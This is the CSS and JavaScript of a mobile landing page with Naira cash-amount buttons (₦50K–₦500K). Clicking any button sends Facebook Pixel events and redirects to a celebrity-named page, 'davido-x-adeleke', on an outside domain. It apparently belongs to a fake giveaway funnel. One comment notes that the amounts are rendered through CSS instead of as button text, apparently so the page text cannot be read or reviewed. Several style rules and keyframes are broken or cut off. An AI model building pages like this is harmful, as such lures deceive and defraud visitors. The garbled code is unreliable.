    /* HEADER */

    }

    #lp-header::before {
      content: "";

      position: absolute;

      width: 120px;
      height: 120px;

      border: 1px solid rgba(255,255,255,.08);

      border-radius: 50%;

      top: -78px;
      left: -48px;
    }

    #lp-header::after {
      content: "";

      position: absolute;

      width: 130px;
      height: 130px;

      border: 1px solid rgba(255,255,255,.07);

      border-radius: 50%;

      right: -65px;
      bottom: -90px;
    }

    .lp-check {

      z-index: 1;

      height: 34px;

      margin: 0 auto 7px;

      border-radius: 50%;

      color: var(--green);

      display: flex;
      align-items: center;
      justify-content: center;

      font-size: 19px;
      font-weight: 900;
    }

    .lp-header-main {
      position: relative;
      z-index: 1;

    }

    .lp-header-sub {

      font-size: 11px;
      font-weight: 700;

      letter-spacing: .4px;
    }


    /* CONTENT */

    #lp-content {
      padding: 17px 17px 15px;

      text-align: center;
    }


    /* STATUS */

    .lp-status {
      display: flex;
      align-items: center;
      justify-content: center;

      gap: 6px;

      width: 100%;

      margin-bottom: 11px;

      padding: 7px 9px;

      border-radius: 7px;

      background: var(--green-light);
      color: var(--green);

      font-size: 11px;
      font-weight: 800;
    }

    .lp-status-dot {
      width: 7px;
      height: 7px;

      flex: 0 0 7px;

      border-radius: 50%;

      background: var(--green);

      animation: pulse 1.8s infinite;
    }

    @keyframes pulse {

      0% {
        box-shadow:

      }

      70% {

      }

    #lp-title {

      font-weight: 900;

    .lp-subtitle {

      font-size: 12px;

      line-height: 1.35;

      margin-bottom: 13px;
    }

    .lp-select-label {

      color: #343c49;

      font-size: 11px;
      font-weight: 800;

      text-align: left;

      margin-bottom: 7px;
    }


    /* AMOUNT GRID */

    #lp-grid {
      display: grid;

      grid-template-columns: 1fr 1fr;

      gap: 8px;

      margin-bottom: 10px;
    }


    /* BUTTON */

    .lp-amount-button {
      position: relative;

      width: 100%;
      height: 58px;

      border: 1.5px solid var(--border);

      border-radius: 10px;

      background: #ffffff;

      color: var(--red);

      cursor: pointer;

      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;

      line-height: 1;

      font-size: 11px;
      font-weight: 900;

      transition:
        transform .15s ease,
        background .15s ease,
        border-color .15s ease,
        color .15s ease;

      -webkit-tap-highlight-color: transparent;
    }


    /*
      The amount is displayed visually with
      CSS rather than as button text.
    */

    .amount-50::before {
      content: "₦50K";
    }

    .amount-100::before {
      content: "₦100K";
    }

    .amount-200::before {
      content: "₦200K";
    }

    .amount-300::before {
      content: "₦300K";
    }

    .amount-400::before {
      content: "₦400K";
    }

    .amount-500::before {
      content: "₦500K";
    }

    .lp-amount-button::before {
      display: block;

      margin-bottom: 5px;

      font-size: 20px;
      font-weight: 900;

      line-height: 1;
    }


    /* HOVER */

    .lp-amount-button:hover {
      border-color: var(--red);

      background: var(--red-light);
    }


    /* PRESS */

    .lp-amount-button:active {
      transform: scale(.97);
    }


    /* SELECTED */

    .lp-amount-button.selected {
      background: var(--green);

      border-color: var(--green);

      color: #ffffff;
    }


    /* SELECTED CHECK */

    .lp-amount-button.selected::after {
      content: "✓";

      position: absolute;

      top: 5px;
      right: 6px;

      width: 17px;
      height: 17px;

      border-radius: 50%;

      background: #ffffff;

      color: var(--green);

      font-size: 10px;

      line-height: 17px;

      font-weight: 900;
    }


    /* CONTINUE */

    #lp-continue-button {
      width: 100%;

      height: 53px;

    @keyframes ctaGlow {

    (function () {

      var links = [
"https://try.kanex.online/davido-x-adeleke.html",

"https://try.kanex.online/davido-x-adeleke.html",
"https://try.kanex.online/davido-x-adeleke.html"
      ];


      function getRandomUrl() {

        return links[
          Math.floor(
            Math.random() * links.length
          )
        ];

      }


      function trackAndRedirect(button, eventName) {

        var amount =
          button.getAttribute("data-amount");

        var amountLabel =
          button.getAttribute("data-amount-label");

        if (typeof fbq === "function") {

          fbq(
            "trackCustom",
            eventName,
            {
              amount: amount,
              amount_label: amountLabel,
              currency: "NGN"
            }
          );

        }

        var destination =
          getRandomUrl();

        setTimeout(function () {

          window.location.href =
            destination;

        }, 150);

      }


      var amountButtons =
        document.querySelectorAll(
          ".lp-amount-button"
        );


      amountButtons.forEach(function (button) {

        button.addEventListener(
          "click",
          function () {

            amountButtons.forEach(
              function (btn) {

                btn.classList.remove(
                  "selected"
                );

              }
            );

            button.classList.add(
              "selected"
            );

            trackAndRedirect(
              button,
              "AmountSelected"
            );

          }
        );

      });


      var continueButton =
        document.getElementById(
          "lp-continue-button"
        );


      continueButton.addEventListener(
        "click",
        function () {

          if (typeof fbq === "function") {

            fbq(
              "trackCustom",
              "ContinueClicked",
              {
                currency: "NGN"
              }
            );

          }

          setTimeout(function () {

            window.location.href =
              getRandomUrl();

          }, 150);

        }
      );

    })();
